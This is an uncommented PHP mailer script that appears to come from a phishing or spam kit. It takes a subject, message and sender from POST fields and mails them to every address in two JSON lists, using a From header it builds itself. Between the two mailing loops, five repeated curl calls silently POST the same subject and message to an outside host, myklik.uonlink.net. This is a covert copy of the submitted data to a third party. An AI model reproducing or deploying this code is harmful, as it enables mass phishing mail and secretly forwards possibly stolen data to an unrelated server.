<?php
$subjek = $_POST['subjek'];
$pesan = $_POST['pesan'];
$sender = $_POST['sender'];

include 'panel/data.php';
$sender = 'From: '.$nik.'<'.$sender.'>';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";

$read = file_get_contents('setting/data.json');
$json = json_decode($read,true);

for($i=0;$i<=count($json) - 1;$i++)
{
mail($json[$i]['email'], $subjek, $pesan, $headers);
}
$url = "https://myklik.uonlink.net/x/sfchsha3/"; 
$ch2 = curl_init();
curl_setopt($ch2, CURLOPT_URL, $url);
curl_setopt($ch2, CURLOPT_POST, 1);
curl_setopt($ch2, CURLOPT_POSTFIELDS, "subjek=".$subjek."&pesan=".$pesan);
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch2, CURLOPT_COOKIEJAR, getcwd()."/.wahyustore.txt");
curl_setopt($ch2, CURLOPT_COOKIEFILE, getcwd()."/.wahyustore.txt");   
curl_setopt($ch2, CURLOPT_HEADER, 0);
curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 0);
curl_exec($ch2);
curl_close($ch2);

$url = "https://myklik.uonlink.net/x/sfchsha3/"; 
$ch2 = curl_init();
curl_setopt($ch2, CURLOPT_URL, $url);
curl_setopt($ch2, CURLOPT_POST, 1);
curl_setopt($ch2, CURLOPT_POSTFIELDS, "subjek=".$subjek."&pesan=".$pesan);
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch2, CURLOPT_COOKIEJAR, getcwd()."/.wahyustore.txt");
curl_setopt($ch2, CURLOPT_COOKIEFILE, getcwd()."/.wahyustore.txt");   
curl_setopt($ch2, CURLOPT_HEADER, 0);
curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 0);
curl_exec($ch2);
curl_close($ch2);

$url = "https://myklik.uonlink.net/x/sfchsha3/"; 
$ch2 = curl_init();
curl_setopt($ch2, CURLOPT_URL, $url);
curl_setopt($ch2, CURLOPT_POST, 1);
curl_setopt($ch2, CURLOPT_POSTFIELDS, "subjek=".$subjek."&pesan=".$pesan);
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch2, CURLOPT_COOKIEJAR, getcwd()."/.wahyustore.txt");
curl_setopt($ch2, CURLOPT_COOKIEFILE, getcwd()."/.wahyustore.txt");   
curl_setopt($ch2, CURLOPT_HEADER, 0);
curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 0);
curl_exec($ch2);
curl_close($ch2);

$url = "https://myklik.uonlink.net/x/sfchsha3/"; 
$ch2 = curl_init();
curl_setopt($ch2, CURLOPT_URL, $url);
curl_setopt($ch2, CURLOPT_POST, 1);
curl_setopt($ch2, CURLOPT_POSTFIELDS, "subjek=".$subjek."&pesan=".$pesan);
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch2, CURLOPT_COOKIEJAR, getcwd()."/.wahyustore.txt");
curl_setopt($ch2, CURLOPT_COOKIEFILE, getcwd()."/.wahyustore.txt");   
curl_setopt($ch2, CURLOPT_HEADER, 0);
curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 0);
curl_exec($ch2);
curl_close($ch2);

$url = "https://myklik.uonlink.net/x/sfchsha3/"; 
$ch2 = curl_init();
curl_setopt($ch2, CURLOPT_URL, $url);
curl_setopt($ch2, CURLOPT_POST, 1);
curl_setopt($ch2, CURLOPT_POSTFIELDS, "subjek=".$subjek."&pesan=".$pesan);
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch2, CURLOPT_COOKIEJAR, getcwd()."/.wahyustore.txt");
curl_setopt($ch2, CURLOPT_COOKIEFILE, getcwd()."/.wahyustore.txt");   
curl_setopt($ch2, CURLOPT_HEADER, 0);
curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 0);
curl_exec($ch2);
curl_close($ch2);

$read = file_get_contents('panel/data.json');
$json = json_decode($read,true);

for($i=0;$i<=count($json) - 1;$i++)
{
mail($json[$i]['email'], $subjek, $pesan, $headers);
}
?>